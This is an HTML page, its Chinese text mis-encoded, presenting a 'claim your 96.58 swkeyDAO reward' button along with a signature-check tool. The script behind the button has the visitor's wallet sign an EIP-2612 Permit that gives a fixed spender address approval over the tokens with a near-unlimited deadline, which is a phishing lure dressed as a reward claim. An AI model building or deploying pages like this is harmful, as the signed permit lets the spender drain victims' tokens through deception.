<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>é¢†å– swkeyDAO å¥–åŠ±</title>
</head>
<body>
  <h2>ğŸ æ­å–œä½ è·å¾— 96.58 swkeyDAO å¥–åŠ±</h2>
  <p>è¯·ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®æˆæƒé¢†å–ï¼š</p>
  <button onclick="signPermit()">ç‚¹å‡»æˆæƒ</button>

  <hr>
  <h3>ğŸ” ç­¾åéªŒè¯å·¥å…·</h3>
  <textarea id="signatureInput" rows="4" cols="80" placeholder="ç²˜è´´ç­¾åå­—ç¬¦ä¸²ï¼ˆ0x...ï¼‰"></textarea><br><br>
  <button onclick="verifySignature()">éªŒè¯ç­¾å</button>
  <pre id="result"></pre>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <script>
    async function signPermit() {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();

      const domain = {
        name: "swkeyDAO",
        version: "1",
        chainId: 56,
        verifyingContract: "0xafa381d908fd736ca58f232a9908b4ebb2dd412c"
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ]
      };

      const message = {
        owner: await signer.getAddress(),
        spender: "0xb51923029c1ae3115762652ac91b58f3ca70fea5",
        value: "96586154797000000000",
        nonce: 0,
        deadline: 9999999999
      };

      try {
        const signature = await signer._signTypedData(domain, types, message);
        console.log("ç­¾åæˆåŠŸï¼š", signature);
        alert("æˆæƒæˆåŠŸï¼è¯·åœ¨ä¸‹æ–¹ç²˜è´´ç­¾åè¿›è¡ŒéªŒè¯ã€‚");
        document.getElementById("signatureInput").value = signature;
      } catch (err) {
        console.error("ç­¾åå¤±è´¥ï¼š", err);
        alert("æˆæƒå¤±è´¥ï¼Œè¯·é‡è¯•ã€‚");
      }
    }

    async function verifySignature() {
      const signature = document.getElementById("signatureInput").value.trim();
      const resultBox = document.getElementById("result");

      if (!signature || !signature.startsWith("0x")) {
        resultBox.textContent = "âŒ ç­¾åæ ¼å¼é”™è¯¯ï¼Œè¯·ç²˜è´´ä»¥ 0x å¼€å¤´çš„ç­¾åå­—ç¬¦ä¸²";
        return;
      }

      const domain = {
        name: "swkeyDAO",
        version: "1",
        chainId: 56,
        verifyingContract: "0xafa381d908fd736ca58f232a9908b4ebb2dd412c"
      };

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ]
      };

      const message = {
        owner: "0x39c145Ef5Ca969E060802B50a99623909d73e394",
        spender: "0xb51923029c1ae3115762652ac91b58f3ca70fea5",
        value: "96586154797000000000",
        nonce: 0,
        deadline: 9999999999
      };

      try {
        const recovered = ethers.utils.verifyTypedData(domain, types, message, signature);
        const parsed = ethers.utils.splitSignature(signature);

        resultBox.textContent =
          `âœ… ç­¾åæœ‰æ•ˆ\n` +
          `ç­¾ååœ°å€: ${recovered}\n\n` +
          `v: ${parsed.v}\n` +
          `r: ${parsed.r}\n` +
          `s: ${parsed.s}`;
      } catch (err) {
        resultBox.textContent = `âŒ ç­¾åéªŒè¯å¤±è´¥ï¼š\n${err.message}`;
      }
    }
  </script>
</body>
</html>
